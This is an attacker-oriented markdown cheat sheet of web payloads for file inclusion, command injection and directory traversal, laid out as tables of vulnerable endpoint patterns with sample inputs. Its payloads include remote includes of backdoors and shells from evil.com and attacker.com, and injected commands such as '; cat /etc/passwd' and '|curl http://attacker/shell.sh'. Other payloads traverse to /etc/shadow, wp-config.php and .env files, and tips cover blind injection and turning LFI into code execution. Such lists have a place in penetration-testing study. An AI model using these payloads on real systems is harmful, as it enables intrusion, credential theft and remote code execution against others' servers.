## 📁 FILE INCLUSION (LFI & RFI) — `Local & Remote File Loaders`

| Location Used | Endpoint Example | Method | Input Vector | Attack Surface / Clue | Sample Payload |
|---------------|------------------|--------|---------------|------------------------|----------------|
| Web Page Loader | `/index.php?page=home` | GET | `page` | Includes files like templates or HTML | `?page=../../../../etc/passwd` |
| Theme/Language Selectors | `/app.php?lang=en` | GET | `lang` | Loads language templates | `?lang=php://filter/convert.base64-encode/resource=config.php` |
| Plugin/Module loaders | `/loadmodule.php?mod=gallery` | GET | `mod` | Includes plugin logic dynamically | `?mod=http://evil.com/backdoor.txt` |
| API Templating | `/api/render` | POST | `template_name` | JSON body, server-side includes | `{"template_name": "http://attacker.com/shell.php"}` |
| Web Logs Viewer | `/admin/viewlog?file=access.log` | GET | `file` | File viewer for logs or archives | `?file=../../../../../../etc/shadow` |

🔍 **Tips**:
- RFI mostly works with PHP <5.3 or outdated configs (`allow_url_include=On`)
- Combine LFI with **Apache logs**, **access logs**, or **proc/self/environ** for code execution!

---

## 🧨 COMMAND INJECTION — When Your `Input Talks to the Shell`

| Endpoint | Method | Parameter | Indicator | Injection Sample |
|----------|--------|-----------|-----------|------------------|
| `/ping?host=127.0.0.1` | GET | `host` | Runs shell utility (`ping`, `traceroute`) | `127.0.0.1; id` |
| `/backup?filename=report` | GET | `filename` | Backup/restore scripts | `report; ls -la` |
| `/network/scan` | POST | `target` (JSON) | Accepts user input for system scanning | `{"target": "127.0.0.1 && whoami"}` |
| `/printer.cgi` | GET | Form field | Often legacy CGI scripts vulnerable | `test|curl http://attacker/shell.sh` |
| `/archive/create` | POST | `folder` | Compresses files (zip/tar) | `folder=/tmp; cat /etc/passwd` |

🛡 **Tips**:
- Try **blind techniques**: `; sleep 5`, `| ping -c 4 attacker.com`
- Test POST JSON too. APIs are goldmines.
- Check logs/headers if output is hidden (Blind CI)

---

## 🗂 DIRECTORY TRAVERSAL — `Involve a file path` to access sensitive files

| Endpoint | Method | Param | Where it Hits | Payload |
|----------|--------|--------|---------------|---------|
| `/view?file=about.html` | GET | `file` | Reads local server files | `?file=../../../../etc/passwd` |
| `/download.php?doc=invoice.pdf` | GET | `doc` | User documents/downloads | `?doc=../../../../../../boot.ini` |
| `/log?name=log1.txt` | GET | `name` | Log viewer or config | `?name=../../../wp-config.php` |
| `/readfile` | POST | `path` | JSON or Form input | `{"path": "../../../../etc/shadow"}` |
| `/static/file` | GET | `filename` | Public file loaders | `?filename=../../../app.py` |

🎯 **Targets to Traverse**:
- `/etc/passwd`, `/etc/shadow`, `boot.ini`, `web.xml`
- Apache logs: `/var/log/apache2/access.log`
- App config: `.env`, `config.php`, `db.yml`

🧠 **Traversal + LFI** → Lethal combo. Especially if `include($_GET[‘page’])` exists.
